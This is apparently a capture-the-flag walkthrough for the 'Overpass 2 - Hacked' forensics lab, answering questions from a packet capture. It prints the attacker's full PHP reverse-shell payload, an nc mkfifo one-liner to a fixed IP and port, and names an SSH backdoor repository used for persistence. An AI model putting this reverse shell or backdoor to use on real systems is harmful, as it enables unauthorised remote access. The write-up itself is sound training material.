# Overpass 2 - Hacked

If you are experiencing trouble, google `wireshark follow tcp stream`

- What was the URL of the page they used to upload a reverse shell?

	- Open Wireshark, and then open the pcap file.
	- `/development/`

- What payload did the attacker use to gain access?

	- You have to search a big POST request.
	- `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

- What password did the attacker use to privesc?

	- Packet no. 76
	- `whe***************tant`

- How did the attacker establish persistence?

	- Packet no. 120
	- `https://github.com/NinjaJc01/ssh-backdoor`